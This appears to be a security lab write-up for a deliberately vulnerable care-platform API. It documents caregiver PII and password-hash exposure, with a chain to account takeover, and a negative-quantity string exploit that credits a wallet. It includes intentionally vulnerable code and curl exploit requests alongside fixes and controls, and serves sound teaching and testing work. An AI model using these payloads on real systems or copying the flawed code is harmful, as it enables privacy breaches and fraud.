---
id: API3:2023
title: Broken Object Property Level Authorization (BOPLA) — Caregiver PII Exposure (read) & Store Quantity Property Tampering (write)
category: API
status: DONE
severity: High
owasp: API3:2023 — Broken Object Property Level Authorization
cwe: "Variant A (read/exposure): CWE-213 / CWE-359 / CWE-200 · Variant B (write/tampering): CWE-1287 / CWE-20 / CWE-840"
source_docs:
  - CareOtter_Test_Suite.md §API-03
  - CareOtter_API.md Vulnerability Surface
affected_components:
  - cloud_api/careotter/api_server/app.py
  - cloud_api/careotter/api_server/services/database_service.py
  - cloud_api/careotter/api_server/services/store_service.py
verified_date: 2026-06-04
---

# API3 — Broken Object Property Level Authorization (BOPLA)

> **OWASP:** API3:2023 — Broken Object Property Level Authorization
> **Variant A — Caregiver PII Exposure (read):** CWE-213 / CWE-359 / CWE-200 · **High**
> **Variant B — Store Quantity Property Tampering (write):** CWE-1287 / CWE-20 / CWE-840 · **High**

---

## Why It Matters

**Broken Object Property Level Authorization (BOPLA)** occurs when an API correctly authorizes access to an *object* but fails to authorize access to individual *properties* of that object — returning fields the caller should never see (**excessive data exposure**, the *read* half) or letting the caller set/modify properties they should never control (**mass assignment / property tampering**, the *write* half). It is the 2023 merge of the former "Excessive Data Exposure" and "Mass Assignment" categories.

This lab demonstrates **one of each half**:

| Variant | Half of BOPLA | Endpoint | Effect |
|---------|---------------|----------|--------|
| **A** | Excessive Data Exposure (read) | `GET /api/patient/caregivers` | A patient reads caregiver **properties** they may not see (PII + `password_hash`) |
| **B** | Property tampering (write) | `POST /api/store/purchase` | A patient assigns an **unvalidated `quantity` property** that drives writes to server-controlled properties (`wallet.balance`, `product.stock`) |

> **Verified:** Variant A — 2026-06-01 · Variant B — 2026-06-04.

---

## Variant A — Excessive Data Exposure (read): Patient Discovers Caregiver PII

> **CWE:** CWE-213 / CWE-359 / CWE-200 · **Severity:** High

CareOtter lets a patient see **who their assigned caregiver is** — a legitimate feature backed by the `caregiver_assignments` table. The endpoint `GET /api/patient/caregivers` is correctly scoped at the **object level**: a patient only ever receives their *own* assigned caregivers. The flaw is at the **property level**: the response exposes the caregiver's private personal information (`display_name`, `email`, `phone`, `address`, `profile_photo`) along with internal fields (`caregiver_id`, `password_hash`) that a patient has no authorization to read.

In a real remote-care platform, a patient learning their nurse's **home address, personal phone number, and email** is a serious privacy breach that enables stalking, harassment, and social engineering. Worse, the leaked `password_hash` is an **unsalted SHA-256** (see API2): a patient can crack it offline, take over the caregiver account, and then — via the caregiver role — pivot to the **API1 BOLA** endpoint and read the cardiac telemetry of *every* patient that caregiver monitors.

> **Why this is BOPLA and not BOLA:** object-level authorization is *intact* here — the patient cannot reach an arbitrary caregiver, only their own. The defect is purely which **properties** of that authorized object are returned. (The API1 > BOLA finding is the opposite: it lets a caller reach the wrong *object*.)

---

## Root Cause

### 1. The data layer over-projects the caregiver object

`database_service.py` → `get_caregivers_for_patient()` joins the assignment onto the caregiver's `users` row and selects **excessive properties**:

```python
SELECT ca.id, ca.caregiver_username, ca.patient_username, ca.created_at,
       u.role,
       u.id            AS caregiver_id,
       u.display_name,
       u.email,
       u.phone,
       u.address,
       u.profile_photo,
       u.password_hash          -- internal secret, never for a patient
FROM caregiver_assignments ca
JOIN users u ON ca.caregiver_username = u.username
WHERE ca.patient_username = ?    -- object scope is CORRECT
ORDER BY ca.created_at DESC
```

The `WHERE ca.patient_username = ?` clause keeps the **object** authorization correct. What is broken is the **projection**: PII and `password_hash` are returned to a caller (the patient) who is not authorized to read those properties. 

### 2. The route exposes the over-projected object in vulnerable mode

`app.py` → `list_patient_caregivers` (`GET /api/patient/caregivers`) returns the full object when `VULNERABLE=1`, and only strips it to a safe whitelist when `VULNERABLE=0`:

```python
caregivers = db.get_caregivers_for_patient(patient_username)
if vuln != 1:
    safe = ('id', 'caregiver_username', 'patient_username', 'created_at', 'role')
    caregivers = [{k: c[k] for k in safe if k in c} for c in caregivers]
```

In `vuln=1` the property-level filter is absent, so the caregiver's PII and password hash reach the patient.

### 3. No DTO / output contract

There is no response schema (DTO / serializer) that defines which caregiver properties a patient may see. The endpoint returns whatever the query produces, so a widened query silently widens the API response — the classic BOPLA failure mode.

---

## Affected Endpoint

| Method | Endpoint | Intended | Actual (vuln=1) |
|--------|----------|----------|-----------------|
| `GET` | `/api/patient/caregivers` | Patient sees the *identity* of their assigned caregiver(s) | **BOPLA** — also returns the caregiver's `email`, `phone`, `address`, `display_name`, `profile_photo`, `caregiver_id`, and `password_hash` |

---

## Steps to Reproduce

**Precondition:** `VULNERABLE=1`; system initialized; `care_john` assigned to `john_doe`.

```bash
# 0. Initialize (seeds users incl. care_john with PII) and assign the caregiver
curl -s http://localhost:5002/initialize_iot >/dev/null

JWT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H 'Content-Type: application/json' \
  -d '{"username":"john_doe","password":"johnny123"}' | jq -r .token)

curl -s -X POST http://localhost:5002/api/patient/caregivers \
  -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"caregiver_username":"care_john"}' >/dev/null
```

### Step 1 — As the patient, list your caregivers

```bash
curl -s -H "Authorization: Bearer $JWT" \
  http://localhost:5002/api/patient/caregivers | jq '.caregivers[0]'
```

### Step 2 — Observe the leaked caregiver PII + hash
![[api3_leaked_caregiver.png]]
### Step 3 — (Chain) crack the unsalted SHA-256 and take over the caregiver

```bash
# The hash is unsalted SHA-256 (API2). Crack offline, then:
curl -s -X POST http://localhost:5002/api/auth/login/caregiver \
  -H 'Content-Type: application/json' \
  -d '{"username":"care_john","password":"<cracked>"}'
# → caregiver JWT → pivot to API1 BOLA: /api/caregiver/patient/<any>/vitals
```

---

## Expected Result

In `VULNERABLE=1`, `GET /api/patient/caregivers` returns `200 OK` with each caregiver object containing `email`, `phone`, `address`, `display_name`, `profile_photo`, `caregiver_id`, and `password_hash`. In `VULNERABLE=0`, the same request returns only `id`, `caregiver_username`, `patient_username`, `created_at`, `role` — no PII, no hash.

---

## How It Should Be

Authorize at the **property level**, not just the object level. Define an explicit output contract for what a patient may see about a caregiver and never return more.

### Minimal fix

```python
# Project only the properties a patient is allowed to see — at the data layer.
SELECT ca.id, ca.caregiver_username, ca.patient_username, ca.created_at,
       u.role, u.display_name        -- name is by-design; no email/phone/address/hash
FROM caregiver_assignments ca
JOIN users u ON ca.caregiver_username = u.username
WHERE ca.patient_username = ?
```

### Architectural improvements

1. **Response DTO / serializer** — define a `CaregiverPublicView` schema with an explicit allow-list; serialize through it so a widened query cannot widen the API.
2. **Never select secrets for read endpoints** — `password_hash` should never appear in any query that feeds a client response.
3. **Classify properties** — tag user fields as public / private / internal and enforce per-role visibility centrally.
4. **Contract tests** — assert the response body of `/api/patient/caregivers` contains only the allow-listed keys, so a regression that re-widens the projection fails CI.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authorization | Property-level allow-list (DTO) on the caregiver view | Return only properties a patient may see |
| Data | Exclude `password_hash`/secrets from any read-path query | Prevent credential exposure |
| Privacy | Classify user fields (public/private/internal) + per-role visibility | Stop PII over-exposure systematically |
| Testing | Contract test asserting the exact response key set | Detect regressions that re-widen the projection |

---

## Verification Checklist

- [ ] `VULNERABLE=1`: `GET /api/patient/caregivers` returns `email`, `phone`, `address`, `profile_photo`, `caregiver_id`, `password_hash`
- [ ] `VULNERABLE=0`: the same request returns only `id`, `caregiver_username`, `patient_username`, `created_at`, `role`
- [ ] Object scope intact: a patient never sees a caregiver they are not assigned to (still BOPLA, not BOLA)
- [ ] The leaked `password_hash` matches the unsalted SHA-256 of the caregiver password (chains to account takeover)
- [ ] `caregiver_assignments` continues to scope the query by `patient_username`

---

## Variant B — Property Tampering via an Unvalidated `quantity` (write): Store Purchase

> **CWE:** CWE-1287 (Improper Validation of Specified Type of Input) / CWE-20 (Improper Input Validation) / CWE-840 (Business Logic Errors) · **Severity:** High

This is the **write half** of BOPLA. The Health Store purchase flow is correctly scoped at the *object* level (an authenticated patient may buy), but it fails to validate the **`quantity` property** of the purchase request. By assigning `quantity` a value it must never be allowed to hold — a **negative number smuggled in as a float-formatted *string*** (e.g. `"-1.0"`) — the patient drives writes to **server-controlled properties they have no authorization to set**: their own `wallet.balance` and the catalog's `product.stock`.

> **Honest classification.** The *immediate* root cause is **input-validation / type confusion**: native `int`s are range-checked and native `float`s are rejected, but a **float-formatted string** is coerced through `float()`→`int()` and truncated, so `"-1.0"` becomes `-1`. It is not textbook mass assignment — the client never names `balance`/`stock`. We file it under BOPLA because the **impact** is property-level: missing validation of a writable property (`quantity`) lets the caller modify protected object properties. The CWEs below say what it technically *is* (type confusion + business logic); the OWASP bucket says where the *impact* lands.

> **Not BFLA, not API6.** Buying is *meant* to be reachable by any patient (`@token_required`) — correct. The per-patient quantity *quota* (a separate, missing limit) is the API6 angle and is out of scope here. This finding is purely the unvalidated property **value**.

> ⚠️ **This resurrects the "infinite money" we deliberately removed from the store** — through a different door. The wallet is a fixed budget with no top-up endpoint, yet a negative-quantity purchase credits it without bound.

> **Toggle.** Gated on `VULNERABLE`, read per-call in the endpoint. With **`VULNERABLE=1`** native types are validated strictly (positive-`int` only; native `float`/`bool` rejected) but a **float-formatted string** is coerced via `float()`→`int()`, so **only** `"-1.0"`-style values smuggle a negative quantity. With **`VULNERABLE=0` (safe)** the endpoint requires a genuine positive `int` and rejects `float`/`str`/`bool` outright, so even the string-float vector is blocked. The vulnerable signed arithmetic in `try_purchase` is unchanged — secure mode simply never lets a negative quantity reach it.

### Root Cause

**1. Only a float-formatted *string* is mis-coerced — every native type is validated.**

`app.py` → `store_purchase` (`POST /api/store/purchase`) — the validation is gated on `VULNERABLE`:

```python
q = data.get('quantity')
if Config.VULNERABLE == 1:
    if isinstance(q, bool) or isinstance(q, float):
        raise ValueError("quantity must be an integer")     # native float/bool: rejected
    elif isinstance(q, int):
        if q < 1:
            raise ValueError("quantity must be a positive integer")  # -1 (int): rejected
        quantity = q
    elif isinstance(q, str) and q.isdigit():
        quantity = int(q)                                    # "5": legit positive int string
    elif isinstance(q, str) and '.' in q:
        quantity = int(float(q))                             # "-1.0" → -1   (THE vector)
    else:
        raise ValueError("quantity must be a positive integer")      # "-1", "abc": rejected
else:
    # SAFE: require a genuine positive int; reject float/str/bool outright
    if isinstance(q, bool) or not isinstance(q, int) or q < 1:
        raise ValueError("quantity must be a positive integer")
    quantity = q
```

In the **vulnerable** branch the type confusion is now surgical:

| Input | Type | Path | Result |
|-------|------|------|--------|
| `"-1.0"` | str, has `.` | `int(float("-1.0"))` | **`-1` accepted — the exploit** |
| `"-1"` | str, no `.`, not `isdigit()` | `else` | `400` rejected |
| `-1` | int | `q < 1` | `400` rejected |
| `-1.0` | float | first guard | `400` rejected |
| `2` | int | `q >= 1` | accepted (legit) |
| `"5"` | str, `isdigit()` | `int("5")` | accepted (legit) |

A `str` is the only type funnelled through `float()`, and only when it contains a `.` (a float literal). So a plain integer string (`"-1"`) and every native numeric type are screened out — the negative slips in **exclusively** as `"-1.0"`-style input. The **safe** branch rejects all of it by requiring a genuine positive `int`.

**2. The data layer does signed arithmetic — a negative quantity becomes a credit.**

`database_service.py` → `try_purchase` enforces stock and balance, but every guard is written for positive quantities and silently passes for negatives:

```python
if check_stock and prod['stock'] < quantity:        # stock(5) < -5  → False, passes
    return {'ok': False, 'error': 'out_of_stock', ...}
...
total = unit_price * quantity                        # 24500 * -5 = -122500  (negative)
if wallet['balance'] < total:                        # 5000 < -122500 → False, passes
    return {'ok': False, 'error': 'insufficient_funds', ...}
...
conn.execute('UPDATE products SET stock = stock - ? ...', (quantity, ...))   # stock - (-5) = stock + 5
conn.execute('UPDATE wallets SET balance = balance - ? ...', (total, ...))   # balance - (-122500) = +122500
```

A single negative-quantity purchase **inflates stock** and **credits the wallet**, and records an order with negative `quantity`/`total`. There is no `MAX(quantity, 1)` floor and no post-coercion positivity check at the data layer.

### Affected Endpoint

| Method | Endpoint | Intended | Actual (`VULNERABLE=1`) |
|--------|----------|----------|-------------------------|
| `POST` | `/api/store/purchase` | Buy a **positive** integer quantity, debiting the wallet | A float-formatted **string** `quantity` (e.g. `"-5.0"`) is coerced via `int(float())` → `-5` → **credits** `wallet.balance` and **inflates** `product.stock`. Native `-5`/`-5.0` and the string `"-5"` are all rejected. |

### Steps to Reproduce

**Precondition:** `VULNERABLE=1`; system initialized; patient `john_doe` has a store wallet (fixed budget). In `VULNERABLE=0` (safe) the float is rejected with `400` and nothing changes.

API rejects the purchase because of insufficient funds to buy the product with the quantity specified.
![[api3_no_funds.png]]

It rejects negative quantity values.

![[api3_invalid_quantity.png]]

But it allows it if `quantity` is a float-formatted **string** (e.g. `"-5.0"`, quoted), which the endpoint coerces via `int(float(...))`.****
![[api3_float_negative_value.png]]

![[api3_wallet_balance_udpate.png]]

```bash
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H 'Content-Type: application/json' \
  -d '{"username":"john_doe","password":"johnny123"}' | jq -r .token)

# baseline balance
curl -s -H "Authorization: Bearer $JWT" http://localhost:5002/api/store/wallet | jq .wallet.balance

# the exploit: quantity as a NEGATIVE FLOAT STRING — note the quotes AND the .0
curl -s -X POST http://localhost:5002/api/store/purchase \
  -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"product_id":1,"quantity":"-5.0"}' | jq

# balance is now HIGHER, not lower
curl -s -H "Authorization: Bearer $JWT" http://localhost:5002/api/store/wallet | jq .wallet.balance
```

Compare: `-5` (int), `-5.0` (native float) and `"-5"` (integer string) **all** return `400`; **only** the float-formatted string `"-5.0"` is accepted.

Besides, the number of products on stock increases.
![[api3_more_stock.png]]
### Expected Result

- **`VULNERABLE=1`:** `POST /api/store/purchase {"product_id":1,"quantity":"-5.0"}` (quoted) returns `201` with `quantity: -5`, `total: -122500.0`, and an **increased** `balance` (e.g. `5000 → 127500` at a unit price of `24500`); `product.stock` rises by 5. The native forms `-5`, `-5.0` and the integer string `"-5"` all return `400`.
- **`VULNERABLE=0` (safe):** even the string-float `"-5.0"` is rejected with `400` ("quantity must be a positive integer") and the wallet is untouched. A valid positive `int` passes validation and proceeds to the normal stock/funds checks.
- In **both** modes, `-5` (int), `-5.0` (float), `"-5"` (string) and `0` are rejected with `400`.

### How It Should Be

Validate the **value** of `quantity` after normalizing its type — never trust the JSON type to be an `int`. This is exactly what the **`VULNERABLE=0` (safe)** branch now runs; the rest of this section is production-hardening beyond the toggle.

```python
q = data.get('quantity')
if not isinstance(q, int) or isinstance(q, bool) or q < 1:   # reject float/str/bool/negatives
    raise ValueError("quantity must be a positive integer")
quantity = q
```

- Reject non-`int` JSON types outright, **or** coerce then enforce `quantity >= 1` *after* coercion.
- Defense in depth at the data layer: floor the quantity (`if quantity < 1: return {'ok': False, 'error': 'bad_quantity'}`) so a bad value never reaches the signed arithmetic; never let `total`/`stock` deltas go negative.
- Add a `CHECK (quantity > 0)` constraint on `orders` so the DB itself refuses a negative order.

### Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Input validation | Strict type+range check on `quantity` (reject non-int, enforce `>= 1` post-coercion) | Stop the float/type-confusion bypass |
| Business logic | Floor quantity and forbid negative `total`/`stock` deltas in `try_purchase` | A bad value can never credit the wallet |
| Data | `CHECK (quantity > 0)` on `orders`; treat `wallet.balance`/`product.stock` as server-only | DB rejects tampered writes |
| Contract | Schema validation (pydantic/marshmallow) on the request body | Type confusion fails before business logic |

### Verification Checklist

- [ ] **`VULNERABLE=1`**: `{"quantity": "-5.0"}` (string-float) → `201`, wallet **credited** `5 × price`, stock **inflated** by 5, order `total` negative — this is the **only** accepted negative
- [ ] **`VULNERABLE=1`**: `{"quantity": -5}` (int), `{"quantity": -5.0}` (native float) and `{"quantity": "-5"}` (integer string) **all** → `400`
- [ ] **`VULNERABLE=1`**: a valid positive `int` (`{"quantity": 2}`) passes validation (then hits stock/funds)
- [ ] **`VULNERABLE=0` (safe)**: even `{"quantity": "-5.0"}` → `400`, wallet untouched; a valid positive `int` passes validation
- [ ] In **both** modes: `{"quantity": 0}` → `400`

---

## References

- `CareOtter_Test_Suite.md` §API-03
- **Variant A** — `cloud_api/careotter/api_server/app.py` (`list_patient_caregivers`), `services/database_service.py` (`get_caregivers_for_patient`, `set_user_pii`)
- **Variant B** — `cloud_api/careotter/api_server/app.py` (`store_purchase`), `services/store_service.py` (`purchase`), `services/database_service.py` (`try_purchase`)
- Related: `API1_Broken_Object_Level_Authorization.md` (object-level — the pivot target), `API2_Broken_Authentication.md` (unsalted SHA-256), `API6_Unrestricted_Access_to_Business_Flows.md` (the store's separate missing-quota angle)
